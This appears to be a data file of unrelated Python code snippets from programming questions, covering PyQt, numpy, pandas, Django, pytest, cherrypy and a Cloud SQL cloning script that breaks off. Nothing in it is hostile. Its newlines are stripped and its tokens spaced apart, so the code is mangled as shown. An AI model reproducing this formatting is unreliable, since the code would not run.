( self , output , delay ) : `` '' '' : param output : used to access BaseSignals : param delay : delay for emitting `` '' '' super ( ) .__init__ ( ) self.output = output # Set Delay self.delay = delay self.queue = Queue ( ) self.timer = QTimer ( ) self.timer.timeout.connect ( self.process ) self.timer.start ( self.delay ) def write ( self , string ) : self.queue.put ( string ) def process ( self ) : `` '' '' Try to send the data to the stream `` '' '' try : data = self.queue.get ( block=False ) self.written.emit ( data ) except Empty : pass def emit ( self , string ) : `` '' '' Force emit of string. `` '' '' self.output.signal_str.emit ( string ) class ConsoleStream ( StringIO ) : `` '' '' Custom StreamIO class that emits a signal on each write. `` '' '' def __init__ ( self , enabled=True , *args , **kwargs ) : `` '' '' Starts a delayed buffer to store writes due to UI refresh limitations . : param enabled : set False to bypass the buffer `` '' '' StringIO.__init__ ( self , *args , **kwargs ) self.enabled = enabled self.output = BaseSignals ( ) # Buffer self.thread = QThread ( ) self.buffer = DelayedBuffer ( self.output , delay=5 ) self.buffer.moveToThread ( self.thread ) self.buffer.written.connect ( self.get ) self.thread.start ( ) def write ( self , string ) : `` '' '' Overrides the parent write method and emits a signal meant to be received by interpreters . : param string : single write output from stdout `` '' '' if self.enabled : self.buffer.write ( string ) else : self.output.signal_str.emit ( string ) def get ( self , string ) : self.output.signal_str.emit ( string ) class PythonInterpreter ( QObject , InteractiveConsole ) : `` '' '' A reimplementation of the builtin InteractiveConsole to work with threads. `` '' '' output = pyqtSignal ( str ) push_command = pyqtSignal ( str ) multi_line = pyqtSignal ( bool ) def __init__ ( self ) : QObject.__init__ ( self ) self.l = { } InteractiveConsole.__init__ ( self , self.l ) self.stream = ConsoleStream ( ) self.stream.output.signal_str.connect ( self.console ) self.push_command.connect ( self.command ) def write ( self , string ) : self.output.emit ( string ) def runcode ( self , code ) : `` '' '' Overrides and captures stdout and stdin from InteractiveConsole. `` '' '' sys.stdout = self.stream sys.stderr = self.stream sys.excepthook = sys.__excepthook__ result = InteractiveConsole.runcode ( self , code ) sys.stdout = sys.__stdout__ sys.stderr = sys.__stderr__ return result @ pyqtSlot ( str ) def command ( self , command ) : `` '' '' : param command : line retrieved from console_input on returnPressed `` '' '' result = self.push ( command ) self.multi_line.emit ( result ) @ pyqtSlot ( str ) def console ( self , string ) : `` '' '' : param string : processed output from a stream `` '' '' self.output.emit ( string ) class MainWindow : `` '' '' The main GUI window . Opens maximized. `` '' '' def __init__ ( self ) : self.ui = uic.loadUi ( `` main.ui '' ) self.ui.showMaximized ( ) # Console Properties self.ui.console_log.document ( ) .setMaximumBlockCount ( 1000 ) self.ui.console_log.setWordWrapMode ( QTextOption.WrapAnywhere ) self.ps1 = ' > > > ' self.ps2 = ' ... ' self.ui.console_prompt.setText ( self.ps1 ) # Spawn Interpreter self.thread = QThread ( ) self.thread.start ( ) self.interpreter = PythonInterpreter ( ) self.interpreter.moveToThread ( self.thread ) # Interpreter Signals self.ui.console_input.returnPressed.connect ( self.send_console_input ) self.interpreter.output.connect ( self.send_console_log ) self.interpreter.multi_line.connect ( self.prompt ) def prompt ( self , multi_line ) : `` '' '' Sets what prompt to use. `` '' '' if multi_line : self.ui.console_prompt.setText ( self.ps2 ) else : self.ui.console_prompt.setText ( self.ps1 ) def send_console_input ( self ) : `` '' '' Send input grabbed from the QLineEdit prompt to the console. `` '' '' command = self.ui.console_input.text ( ) self.ui.console_input.clear ( ) self.interpreter.push_command.emit ( str ( command ) ) def send_console_log ( self , command ) : `` '' '' Set the output from InteractiveConsole in the QTextEdit . Auto scroll scrollbar. `` '' '' # Checks if scrolled old_cursor = self.ui.console_log.textCursor ( ) old_scrollbar = self.ui.console_log.verticalScrollBar ( ) .value ( ) new_scrollbar = self.ui.console_log.verticalScrollBar ( ) .maximum ( ) if old_scrollbar == new_scrollbar : scrolled = True else : scrolled = False # Sets the text self.ui.console_log.insertPlainText ( command ) # Scrolls/Moves cursor based on available data if old_cursor.hasSelection ( ) or not scrolled : self.ui.console_log.setTextCursor ( old_cursor ) self.ui.console_log.verticalScrollBar ( ) .setValue ( old_scrollbar ) else : self.ui.console_log.moveCursor ( QTextCursor.End ) self.ui.console_log.verticalScrollBar ( ) .setValue ( self.ui.console_log.verticalScrollBar ( ) .maximum ( ) ) def main ( ) : app = QApplication ( sys.argv ) window = MainWindow ( ) sys.exit ( app.exec_ ( ) ) if __name__ == `` __main__ '' : main ( )"
"# ! /usr/bin/env python3import numpy as npimport matplotlib.pyplot as plt # the matrix with the reference color elementsref=np.full ( [ 7 , 7 , 3 ] , [ 255,255,255 ] , dtype=np.uint8 ) ref [ 0 ] [ 6 ] = ( 239,238,185 ) ref [ 1 ] [ 1 ] = ( 120,131,125 ) ref [ 4 ] [ 6 ] = ( 184,191,171 ) ref [ 6 ] [ 2 ] = ( 150,168,158 ) ref [ 6 ] [ 5 ] = ( 166,180,166 ) # s = ref.shape # # from scipy.ndimage.interpolation import zoom # zooming as in https : //stackoverflow.com/a/39485650/1230358 does n't seem to work here anymore , because we have no corner point as reference but randomly distributed points within the matrix . As far as I know ... # zoomed=zoom ( ref , ( 256/s [ 0 ] ,256/s [ 1 ] ,1 ) , order=1 ) plt.subplot ( 211 ) plt.imshow ( ref , interpolation='nearest ' ) # plt.subplot ( 212 ) # plt.imshow ( zoomed , interpolation='nearest ' ) plt.show ( )"
"ERROR ? pyinotify : add_watch : can not watch /home/user/.local/share/Odoo/addons/8.0 WD=-1 , Errno=No space left on device ( ENOSPC ) sysctl -n -w fs.inotify.max_user_watches=16384 openerp.service.server : Watching addons folder /opt/odoo_8/src/linked-addonsopenerp.service.server : AutoReload watcher running"
mystring.toLowerCase ( ) .match ( / [ a-z ] +/g ) ;
"test_has_perm_in_foobar.py FTraceback ( most recent call last ) : File `` / ... /test_has_perm_in_foobar.py '' , line 50 , in test_has_perm self.assertFalse ( check_perm ( request , some_object ) ) File `` /usr/lib/python2.7/unittest/case.py '' , line 416 , in assertFalse raise self.failureException ( msg ) AssertionError : True is not false def check_perm ( request , some_object ) : if condition_1 : return True if condition_2 : return sub_check ( some_object ) if condition_3 : return sub_check2 ( some_object ) ... + if condition_1 : + return True"
"# generate test dataframedata = np.random.randint ( 0,10 , ( 366,2 ) ) index = pd.date_range ( start=pd.Timestamp ( ' 1-Dec-2012 ' ) , periods=366 , unit='D ' ) test = pd.DataFrame ( data , index=index ) # generate group arraygroup = np.random.randint ( 0,2 , ( 366 , ) ) # define how dictionary for resamplehow_dict = { 0 : np.max , 1 : np.min } # perform grouping and resampletest.groupby ( group ) .resample ( '48 h ' , how=how_dict ) def frequent ( x ) : ( value , counts ) = np.unique ( x , return_counts=True ) return value [ counts.argmax ( ) ] how_dict = { 0 : np.max , 1 : frequent } df = test.groupby ( group ) .resample ( '48 h ' , how=how_dict ) df.shape"
pipenv -- python==3.6pipenv install pytest==4.4.1pipenv install pytest-asyncio==0.10.0 import asyncioimport pytest @ pytest.fixturedef my_fixture ( ) : # attempt to start a timer that will stop the test somehow asyncio.ensure_future ( time_limit ( ) ) yield 'eggs'async def time_limit ( ) : await asyncio.sleep ( 5 ) print ( 'time limit reached ' ) # this is n't printed raise AssertionError @ pytest.mark.asyncioasync def test ( my_fixture ) : assert my_fixture == 'eggs ' await asyncio.sleep ( 10 ) print ( 'this should not print ' ) # this is printed assert 0
"A = np.array ( [ [ 1 , 2 , 3 , 4 , 5 ] , [ 6 , 7 , 8 , 9 , 10 ] , [ 11,12,13,14,15 ] ] ) # A is a 3x5 matrix , such that the shape of A is ( 3 , 5 ) ( and A [ 0 ] is ( 5 , ) ) B = np.array ( [ [ 1,0,0 ] , [ 0,2,0 ] , [ 0,0,3 ] ] ) # B is a 3x3 ( diagonal ) matrix , with a shape of ( 3 , 3 ) C = np.zeros ( 5 ) for i in range ( 5 ) : C [ i ] = np.linalg.multi_dot ( [ A [ : ,i ] .T , B , A [ : ,i ] ] ) # Each row of matrix math is [ 1x3 ] * [ 3x3 ] * [ 3x1 ] to become a scaler value in each row # C becomes a [ 5x1 ] matrix with a shape of ( 5 , )"
"from numba import struct , int32my_struct_type = struct ( [ ( 'value_a ' , int32 ) , ( 'value_b ' , int32 ) ] )"
"import relist = open ( `` text_isbn '' , `` r '' ) regex = re.compile ( ' ( ? : [ 0-9 ] { 3 } - ) ? [ 0-9 ] { 1,5 } - [ 0-9 ] { 1,7 } - [ 0-9 ] { 1,6 } - [ 0-9 ] ' ) parsed = regex.findall ( list ) Praxisguide Wissensmanagement - 978-3-540-46225-5Programmiersprachen - 978-3-8274-2851-6Effizient im Studium - 978-3-8348-8108-3"
"import jsonfrom selenium import webdriver # print settings : save as pdf , 'letter ' formattingappState = `` '' '' { `` recentDestinations '' : [ { `` id '' : `` Save as PDF '' , `` origin '' : `` local '' } ] , `` mediaSize '' : { `` height_microns '' : 279400 , `` name '' : `` NA_LETTER '' , `` width_microns '' : 215900 , `` custom_display_name '' : `` Letter '' } , `` selectedDestinationId '' : `` Save as PDF '' , `` version '' : 2 } '' '' '' appState = json.loads ( appState ) profile = { `` printing.print_preview_sticky_settings.appState '' : json.dumps ( appState ) } chrome_options = webdriver.ChromeOptions ( ) chrome_options.add_experimental_option ( 'prefs ' , profile ) # Enable automatically pressing the print button in print preview # https : //peter.sh/experiments/chromium-command-line-switches/chrome_options.add_argument ( ' -- kiosk-printing ' ) driver = webdriver.Chrome ( './chromedriver ' , options=chrome_options ) driver.get ( 'http : //www.deeplearningbook.org/contents/intro.html ' ) driver.execute_script ( 'window.print ( ) ; ' ) driver.quit ( )"
"x = tf.placeholder ( tf.float32 , ( ) , name= ' x ' ) z = x + tf.constant ( 5.0 ) y = tf.mul ( z , tf.constant ( 0.5 ) ) with tf.Session ( ) as sess : print ( sess.run ( y , feed_dict= { x : 30 } ) )"
"def update_figure ( self ) : self.yAxis = np.append ( self.yAxis , ( getCO22 ( ) ) ) self.xAxis = np.append ( self.xAxis , self.i ) # print ( self.xAxis ) if len ( self.yAxis ) > 10 : self.yAxis = np.delete ( self.yAxis , 0 ) if len ( self.xAxis ) > 10 : self.xAxis = np.delete ( self.xAxis , 0 ) self.axes.plot ( self.xAxis , self.yAxis , scaley=False ) self.axes.grid ( True ) self.i = self.i + 1 self.draw ( ) def timer ( self ) : getCH4 ( ) getCO2 ( ) getConnectedDevices ( ) self.dc.update_figure ( ) t = threading.Timer ( 1.0 , self.timer ) t.start ( ) def task ( self ) : while True : ui.dc.update_figure ( ) time.sleep ( 1.0 ) def timer ( self ) : t = Timer ( 1.0 , self.task ( ) ) t.start ( )"
"import timeimport cherrypyfrom cherrypy.process import pluginstheData = 0def processData ( ) : `` '' '' Backround task works for half hour three times a day , and when finishes it publish it in the engine buffer . '' '' '' global theData # using global variables to simplify the example theData += 1 cherrypy.engine.publish ( `` doChangeData '' , theData ) class DataPublisher ( object ) : def __init__ ( self ) : self.data = 'initData ' cherrypy.engine.subscribe ( 'doChangeData ' , self.changeData ) def changeData ( self , newData ) : cherrypy.engine.log ( `` Changing data , buffering should start ! '' ) self.data = newData time.sleep ( 1 ) # exageration of the 1 milisec of the references update to visualize the problem cherrypy.engine.log ( `` Continue serving buffered and new requests . '' ) @ cherrypy.expose def index ( self ) : result = `` I get `` +str ( self.data ) cherrypy.engine.log ( result ) time.sleep ( 3 ) return resultif __name__ == '__main__ ' : conf = { '/ ' : { 'server.socket_host ' : '127.0.0.1 ' , 'server.socket_port ' : 8080 } } cherrypy.config.update ( conf ) btask = plugins.BackgroundTask ( 5 , processData ) # 5 secs for the example btask.start ( ) cherrypy.quickstart ( DataPublisher ( ) ) ... [ 17/Sep/2015:21:32:41 ] ENGINE Changing data , buffering should start ! 127.0.0.1 - - [ 17/Sep/2015:21:32:41 ] `` GET / HTTP/1.1 '' 200 7 `` ... [ 17/Sep/2015:21:32:42 ] ENGINE I get 3 [ 17/Sep/2015:21:32:42 ] ENGINE Continue serving buffered and new requests.127.0.0.1 - - [ 17/Sep/2015:21:24:44 ] `` GET / HTTP/1.1 '' 200 7 `` ... ... ... 127.0.0.1 - - [ 17/Sep/2015:21:32:41 ] `` GET / HTTP/1.1 '' 200 7 `` ... [ 17/Sep/2015:21:32:41 ] ENGINE Changing data , buffering should start ! [ 17/Sep/2015:21:32:42 ] ENGINE Continue serving buffered and new requests . [ 17/Sep/2015:21:32:42 ] ENGINE I get 3127.0.0.1 - - [ 17/Sep/2015:21:24:44 ] `` GET / HTTP/1.1 '' 200 7 `` ... ... @ cherrypy.exposedef index ( self ) : tempData = self.data result = `` I started with % s '' % str ( tempData ) time.sleep ( 3 ) # Heavy use of tempData result += `` that changed to % s '' % str ( self.data ) result += `` but I am still using % s '' % str ( tempData ) cherrypy.engine.log ( result ) return result"
"import timeimport numpyfrom multiprocessing import Pooldef test_func ( i ) : a = numpy.random.normal ( size=1000000 ) b = numpy.random.normal ( size=1000000 ) for i in range ( 2000 ) : a = a + b b = a - b a = a - b return 1t1 = time.time ( ) test_func ( 0 ) single_time = time.time ( ) - t1print ( `` Single time : '' , single_time ) n_par = 4pool = Pool ( ) t1 = time.time ( ) results_async = [ pool.apply_async ( test_func , [ i ] ) for i in range ( n_par ) ] results = [ r.get ( ) for r in results_async ] multicore_time = time.time ( ) - t1print ( `` Multicore time : '' , multicore_time ) print ( `` Efficiency : '' , single_time / multicore_time )"
def get_x ( d : dict ) - > int : d [ `` x '' ]
"query countfoo bar 10super 8 foo 4super foo bar 2 def _words ( df ) : return df [ 'query ' ] .str.get_dummies ( sep= ' ' ) .T.dot ( df [ 'count ' ] ) bar 12foo 16super 10 def _probability ( df , query ) : return df [ query ] / df.groupby [ 'count ' ] .sum ( )"
"class MyFrame ( wx.Frame ) : def __init__ ( self , *args , **kwds ) : # ... sizers and other stuff self.myslider = wx.Slider ( self.notebook_1_pane_2 , wx.ID_ANY , 0 , -100 , 100 , style=wx.SL_SELRANGE ) # ... self.myslider.SetSelection ( 10 , 90 )"
"A = [ { 'ID':1 , 'Period':1 , 'Variable':21 } , { 'ID':1 , 'Period':2 , 'Variable':12 } , { 'ID':2 , 'Period':2 , 'Variable':14 } , { 'ID':2 , 'Period':3 , 'Variable':18 } ] df = pd.DataFrame ( A )"
"> > > a = np.random.rand ( 5,5 ) > > > print a [ [ 0.83367208 0.29507876 0.41849799 0.58342521 0.81810562 ] [ 0.31363351 0.69468009 0.14960363 0.7685722 0.56240711 ] [ 0.49368821 0.46409791 0.09042236 0.68706312 0.98430387 ] [ 0.21816242 0.87907115 0.49534121 0.60453302 0.75152033 ] [ 0.10510938 0.55387841 0.37992348 0.6754701 0.27095986 ] ] > > > b = np.random.rand ( 5,5 ) > > > print b [ [ 0.52237011 0.75242666 0.39895415 0.66519185 0.87043142 ] [ 0.08624797 0.66193953 0.80640822 0.95403594 0.33977566 ] [ 0.13789573 0.84868366 0.09734757 0.06010175 0.48043968 ] [ 0.28871551 0.62186888 0.44603741 0.3351644 0.6417847 ] [ 0.85745394 0.93179792 0.62535765 0.96625077 0.86880908 ] ] > > > [ 0.83367208 0.52237011 0.29507876 0.75242666 0.41849799 0.39895415 0.58342521 0.66519185 0.81810562 0.87043142 ]"
job_1job_2job_3
"X1 = np.array ( [ [ 1,2,3 ] , [ 4,5,6 ] , [ 7,8,9 ] ] ) X2 = np.array ( [ 1,4,7 ] ) def some_func ( X ) : if len ( X.shape ) == 1 : X = X [ : , np.newaxis ] return X [ : ,0 ] .sum ( ) some_func ( X2 ) some_func ( X1 [ : , 0 ] ) some_func ( X1 )"
"enum { invalid = 0 , type1 = 1 , type2 = 2 } type_enum ; INVALID = 0TYPE1 = 1TYPE2 = 2"
"import tkinter as tkfrom tkinter import ttkclass MyTab ( ttk.Frame ) : `` '' '' Frame to be added to each tab of the notebook. `` '' '' def __init__ ( self , master , idx , *args , **kwargs ) : super ( ) .__init__ ( master , *args , **kwargs ) self._button = ttk.Button ( self , text='Tab { } '.format ( idx ) , command=lambda *args , x=idx : self._handle_button ( x , *args ) , underline=0 ) self.bind ( ' < Alt-t > ' , lambda *args , x=idx : self._handle_button ( x , *args ) ) self._button.pack ( ) self.pack ( ) def _handle_button ( self , x , *args ) : print ( 'Button : Tab { } '.format ( x ) ) class MainWdw ( ttk.Frame ) : `` '' '' Main application window. `` '' '' def __init__ ( self , master , *args , **kwargs ) : super ( ) .__init__ ( master , *args , **kwargs ) self._nb = ttk.Notebook ( self ) # Generate several tabs and add a MyTab object to each . self._tabs = [ ] for x in range ( 1 , 6 ) : t = MyTab ( self , x ) self._tabs.append ( t ) self._nb.add ( t , text='Tab { } '.format ( x ) ) self._nb.pack ( expand=1 , fill='both ' ) master.title ( 'Sample ' ) self.pack ( expand=1 , fill='both ' , padx=2 , pady=2 ) def main ( ) : root = tk.Tk ( ) app = MainWdw ( root ) root.mainloop ( ) if __name__ == '__main__ ' : main ( )"
.. automodule : : modname : members :
"e = Employee ( key_name = 'some_key_name ' , name='John Bonham ' ) db.put_async ( e ) e = Employee.get_by_key_name ( 'some_key_name ' ) # e is None e = Employee ( key_name = 'some_key_name ' , name='John Bonham ' ) op = db.put_async ( e ) op.get_result ( )"
"class MyString ( str ) : def __new__ ( cls , value= '' ) : return str.__new__ ( cls , value ) def __radd__ ( self , value ) : # what method should I use ? ? return MyString ( self + value ) # what goes here ? ? def write ( self , data ) : self.__radd__ ( data ) b = MyString ( ' g ' ) b.write ( ' h ' ) # b should now be 'gh ' class StringInside ( object ) : def __init__ ( self , data= '' ) : self.data = data def write ( self , data ) : self.data += data def read ( self ) : return self.data timeit.timeit ( `` arr+='1234567890 ' '' , setup= '' arr = `` '' , number=10000 ) 0.004415035247802734timeit.timeit ( `` arr.write ( '1234567890 ' ) '' , setup= '' from hard import StringInside ; arr = StringInside ( ) '' , number=10000 ) 0.0331270694732666 class Mike ( object ) : def __init__ ( self , data= '' ) : self._data = [ ] self._data.extend ( data ) def write ( self , data ) : self._data.extend ( data ) def read ( self , stop=None ) : return `` .join ( self._data [ 0 : stop ] ) def pop ( self , stop=None ) : if not stop : stop = len ( self._data ) try : return `` .join ( self._data [ 0 : stop ] ) finally : self._data = self._data [ stop : ] def __getitem__ ( self , key ) : return `` .join ( self._data [ key ] ) from libcpp.string cimport stringcdef class CyString : cdef string buff cdef public int length def __cinit__ ( self , string data= '' ) : self.length = len ( data ) self.buff = data def write ( self , string new_data ) : self.length += len ( new_data ) self.buff += new_data def read ( self , int length=0 ) : if not length : length = self.length return self.buff.substr ( 0 , length ) def pop ( self , int length=0 ) : if not length : length = self.length ans = self.buff.substr ( 0 , length ) self.buff.erase ( 0 , length ) return ans > > > timeit.timeit ( `` arr.write ( '1234567890 ' ) '' , setup= '' from pyversion import Mike ; arr = Mike ( ) '' , number=1000000 ) 0.5992741584777832 > > > timeit.timeit ( `` arr.write ( '1234567890 ' ) '' , setup= '' from cyversion import CyBuff ; arr = CyBuff ( ) '' , number=1000000 ) 0.17381906509399414 > > > timeit.timeit ( `` arr.write ( '1234567890 ' ) ; arr.read ( 5 ) '' , setup= '' from pyversion import Mike ; arr = Mike ( ) '' , number=1000000 ) 1.1499049663543701 > > > timeit.timeit ( `` arr.write ( '1234567890 ' ) ; arr.read ( 5 ) '' , setup= '' from cyversion import CyBuff ; arr = CyBuff ( ) '' , number=1000000 ) 0.2894480228424072 > > > # note I 'm using 10e3 iterations - the python version would n't return otherwise > > > timeit.timeit ( `` arr.write ( '1234567890 ' ) ; arr.pop ( 5 ) '' , setup= '' from pyversion import Mike ; arr = Mike ( ) '' , number=10000 ) 0.7390561103820801 > > > timeit.timeit ( `` arr.write ( '1234567890 ' ) ; arr.pop ( 5 ) '' , setup= '' from cyversion import CyBuff ; arr = CyBuff ( ) '' , number=10000 ) 0.01501607894897461"
"repo/ src/ my_package/ __init__.py module_a.py module_b.py ... tests/ test_this.py test_that.py requirements.txt setup.py tox.ini [ tox ] envlist = py27 , py36 , coverage-report [ testenv ] deps = -rrequirements.txtcommands = coverage run -p -m pytest -- [ pytest ] addopts = -- doctest-modules"
"from typing import NamedTupleclass Base1 : def foo ( self ) : print ( self.__annotations__ ) class Test1 ( NamedTuple , Base1 ) : x : int y : intx = Test1 ( 1 , 2 ) x.foo ( ) # raises AttributeErrorclass Base2 ( NamedTuple ) : def foo ( self ) : print ( self.__annotations__ ) class Test2 ( Base2 ) : x : int y : intx = Test2 ( 1 , 2 ) # TypeError : __new__ ( ) takes 1 positional argument but 3 were given"
"from datetime import date , timedeltafrom django.test import TestCasefrom app.test.factories import MemberFactory , ProgrammeFactoryfrom app.models.member_programme import MemberProgrammeclass MemberProgrammeTestCase ( TestCase ) : def member_programme ( self ) : yesterday = date.today ( ) - timedelta ( days=1 ) return MemberProgramme.objects.create ( mem=MemberFactory ( ) , prg=ProgrammeFactory ( ) , date_registered=yesterday ) def date_registered_should_be_defined_test ( self ) : # This test passes memprg = self.member_programme ( ) assert hasattr ( memprg , 'date_registered ' ) def date_registered_should_be_in_past_test ( self ) : # This test fails memprg = self.member_programme ( ) assert memprg.date_registered < date.today ( ) class CountryOfOriginFactory ( factory.Factory ) : `` '' '' Factory class for app.models.CountryOfOrigin `` '' '' FACTORY_FOR = CountryOfOrigin code = 'UK ' the_country = 'United Kingdom'class MemberFactory ( factory.Factory ) : `` '' '' Factory class for app.models.Member `` '' '' FACTORY_FOR = Member first_name = 'Test ' surname = 'User ' sex = 'M ' date_of_birth = datetime.date ( 1990 , 1 , 1 ) origin = factory.LazyAttribute ( lambda a : CountryOfOriginFactory ( ) ) IntegrityError : duplicate key value violates unique constraint `` country_of_origin_code_key '' dba test_app 127.0.0.1 2012-09-04 21:51:50.806 UTC LOG : duration : 0.038 ms statement : BEGIN ; SET TRANSACTION ISOLATION LEVEL READ COMMITTEDdba test_app 127.0.0.1 2012-09-04 21:51:50.808 UTC LOG : duration : 0.903 ms statement : INSERT INTO `` member_programme '' ( `` mem_id '' , `` prgm_id '' , `` date_registered '' , `` date_completed '' , `` ordinality '' ) VALUES ( 1 , 1 , E'2012-09-04 ' , NULL , 1 ) dba test_app 127.0.0.1 2012-09-04 21:51:50.808 UTC LOG : duration : 0.150 ms statement : SELECT CURRVAL ( pg_get_serial_sequence ( ' '' member_programme '' ' , 'id ' ) ) dba test_app 127.0.0.1 2012-09-04 21:51:50.810 UTC LOG : duration : 1.796 ms statement : COMMITdba test_app_django 127.0.0.1 2012-09-04 21:51:50.811 UTC LOG : duration : 0.056 ms statement : ROLLBACK < -- -- ROLLBACK ON DJANGO DB ONLYdba test_app_django 127.0.0.1 2012-09-04 21:51:50.814 UTC LOG : disconnection : session time : 0:00:21.005 user=dba database=test_app_django host=127.0.0.1 port=60355dba test_app 127.0.0.1 2012-09-04 21:51:50.818 UTC LOG : disconnection : session time : 0:00:04.751 user=dba database=test_app host=127.0.0.1 port=60357dba test_app 127.0.0.1 2012-09-04 21:54:00.796 UTC LOG : connection authorized : user=dba database=test_appdba test_app 127.0.0.1 2012-09-04 21:54:00.802 UTC LOG : duration : 0.243 ms statement : SET DATESTYLE TO 'ISO'dba test_app 127.0.0.1 2012-09-04 21:54:00.802 UTC LOG : duration : 0.156 ms statement : SHOW client_encodingdba test_app 127.0.0.1 2012-09-04 21:54:00.803 UTC LOG : duration : 0.047 ms statement : SHOW default_transaction_isolationdba test_app 127.0.0.1 2012-09-04 21:54:00.803 UTC LOG : duration : 0.068 ms statement : BEGIN ; SET TRANSACTION ISOLATION LEVEL READ COMMITTEDdba test_app 127.0.0.1 2012-09-04 21:54:00.804 UTC LOG : duration : 0.410 ms statement : SET TIME ZONE E'Pacific/Auckland'dba test_app 127.0.0.1 2012-09-04 21:54:00.805 UTC ERROR : duplicate key value violates unique constraint `` country_of_origin_code_key ''"
"> > > a , b = a [ b ] = { } , 5 > > > a { 5 : ( { ... } , 5 ) }"
"class Report ( models.Model ) : name = models.CharField ( max_length=255 ) slug = AutoSlugField ( _ ( 'slug ' ) , populate_from='name ' ) wells = models.ManyToManyField ( Well , null=True ) uuid = UUIDField ( editable=False , blank=True , version=4 , unique=True ) class Well ( models.Model ) : slug = AutoSlugField ( _ ( 'slug ' ) , populate_from='name ' ) name = models.CharField ( max_length=255 ) class Node ( models.Model ) : @ property def well ( self ) : raise NotImplementedError ( `` The 'well ' field must be implemented '' ) //irrelevant GFK omitted page_content_type = models.ForeignKey ( ContentType , null=True , blank=True , related_name='page ' ) page_object_id = models.PositiveIntegerField ( blank=True , null=True ) page_content_object = generic.GenericForeignKey ( 'page_content_type ' , 'page_object_id ' ) class ReportResource ( ModelResource ) : wells = fields.ManyToManyField ( WellResource , 'wells ' , full=True ) stock = fields.ForeignKey ( TickerResource , 'stock ' , full=True ) class Meta : queryset = Report.objects.all ( ) resource_name = 'ticker_reports'class WellResource ( ModelResource ) : nodes = fields.ToManyField ( 'wells.api.NodeResource ' , 'nodes ' , full=True ) type = fields.ForeignKey ( WellTypeResource , 'type ' , full=True ) class Meta : queryset = Well.objects.all ( ) resource_name = 'wells'class NodeResource ( ModelResource ) : order = fields.IntegerField ( ) content_object = GenericForeignKeyField ( { Content : UUIDOnlyContentResource } , 'content_object ' , full=True ) class Meta : queryset = Node.objects.all ( ) resource_name = 'nodes ' filtering = { 'ticker_report ' : ALL_WITH_RELATIONS } > > > r = Report.objects.get ( id=1 ) > > > for well in r.wells.all ( ) : ... for node in well.nodes.all ( ) : ... print 'Node in Well { 0 } is { 1 } '.format ( well , node ) ... Node in Well The Areas You Must Watch ( the-areas-you-must-watch - Fancy List ) is Apple Content # 1 : Apple ( 0 ) Node in Well The Areas You Must Watch ( the-areas-you-must-watch - Fancy List ) is First Solar Content # 1 : first solar ( 0 ) Node in Well Risks ( risks - Headline and Lead ) is Apple Content # 2 : Apple ( 0 ) Node in Well Risks ( risks - Headline and Lead ) is First Solar Content # 2 : first solar ( 0 ) > > > SELECT node.id , node.uuid , node.order , node.content_type_id , node.object_id , node.page_content_type_id , node.page_object_id , node.well_id FROM node WHERE node.well_id = 1 ORDER BY node.order ASC SELECT node.id , node.uuid , node.order , node.content_type_id , node.object_id , node.page_content_type_id , node.page_object_id , node.well_id FROM node WHERE node.well_id = 1 AND node.page_content_type_id = 99 /*Report Content TypeID */ AND node.page_content_object_id = 1 /*ReportID*/ORDER BY node.order ASC Node in Well The Areas You Must Watch is Apple Content # 1Node in Well Risks is Apple Content # 2 : Apple ( 0 )"
"from os import getenvfrom datetime import datetimefrom time import sleepfrom googleapiclient import discoveryfrom googleapiclient.errors import HttpErrorfrom oauth2client.client import GoogleCredentialsfrom google.cloud import storageGS_BUCKET = getenv ( `` GS_BUCKET '' ) GS_FOLDER = `` sql-exports '' GS_EXPORT_PATH = f '' gs : // { GS_BUCKET } / { GS_FOLDER } '' def __sql_file_name ( db : str , timestamp : datetime ) : return f '' { db } - { timestamp.strftime ( ' % Y- % m- % d ' ) } .sql.gz '' def __sql_file_uri ( db : str , timestamp : datetime ) : return f '' { GS_EXPORT_PATH } / { __sql_file_name ( db , timestamp ) } '' def __export_source_db ( service , project : str , timestamp : datetime , instance : str , db : str ) : context = { `` exportContext '' : { `` kind '' : `` sql # exportContext '' , `` fileType '' : `` SQL '' , `` uri '' : __sql_file_uri ( db , timestamp ) , `` databases '' : [ db ] , } } return service.instances ( ) .export ( project=project , instance=instance , body=context ) .execute ( ) def __import_target_db ( service , project : str , timestamp : datetime , instance : str , db : str ) : context = { `` importContext '' : { `` kind '' : `` sql # importContext '' , `` fileType '' : `` SQL '' , `` uri '' : __sql_file_uri ( db , timestamp ) , `` database '' : db , } } return service.instances ( ) .import_ ( project=project , instance=instance , body=context ) .execute ( ) def __drop_db ( service , project : str , instance : str , db : str ) : try : return service.databases ( ) .delete ( project=project , instance=instance , database=db ) .execute ( ) except HttpError as e : if e.resp.status == 404 : return { `` status '' : `` DONE '' } else : raise edef __create_db ( service , project : str , instance : str , db : str ) : database = { `` name '' : db , `` project '' : project , `` instance '' : instance , } return service.databases ( ) .insert ( project=project , instance=instance , body=database ) .execute ( ) def __update_export_permissions ( file_name : str ) : client = storage.Client ( ) file = client.get_bucket ( GS_BUCKET ) .get_blob ( f '' { GS_FOLDER } / { file_name } '' ) file.acl.user ( getenv ( `` TARGET_DB_SERVICE_ACCOUNT '' ) ) .grant_read ( ) file.acl.save ( ) def __delete_sql_file ( file_name : str ) : client = storage.Client ( ) bucket = client.get_bucket ( GS_BUCKET ) bucket.delete_blob ( f '' { GS_FOLDER } / { file_name } '' ) def __wait_for ( operation_type , operation , service , project ) : if operation [ `` status '' ] in ( `` PENDING '' , `` RUNNING '' , `` UNKNOWN '' ) : print ( f '' { operation_type } operation in { operation [ 'status ' ] } status . Waiting for completion ... '' ) while operation [ 'status ' ] ! = `` DONE '' : sleep ( 1 ) operation = service.operations ( ) .get ( project=project , operation=operation [ 'name ' ] ) .execute ( ) print ( f '' { operation_type } operation completed ! `` ) def clone_db ( _ ) : credentials = GoogleCredentials.get_application_default ( ) service = discovery.build ( 'sqladmin ' , 'v1beta4 ' , credentials=credentials ) # Project ID of the project that contains the instance to be exported . project = getenv ( 'PROJECT_ID ' ) # Cloud SQL instance ID . This does not include the project ID . source = { `` instance '' : getenv ( `` SOURCE_INSTANCE_ID '' ) , `` db '' : getenv ( `` SOURCE_DB_NAME '' ) } timestamp = datetime.utcnow ( ) print ( f '' Exporting database { source [ 'instance ' ] } : { source [ 'db ' ] } to Cloud Storage ... '' ) operation = __export_source_db ( service , project , timestamp , **source ) __wait_for ( `` Export '' , operation , service , project ) print ( `` Updating exported file permissions ... '' ) __update_export_permissions ( __sql_file_name ( source [ `` db '' ] , timestamp ) ) print ( `` Done . '' ) target = { `` instance '' : getenv ( `` TARGET_INSTANCE_ID '' ) , `` db '' : getenv ( `` TARGET_DB_NAME '' ) } print ( f '' Dropping target database { target [ 'instance ' ] } : { target [ 'db ' ] } '' ) operation = 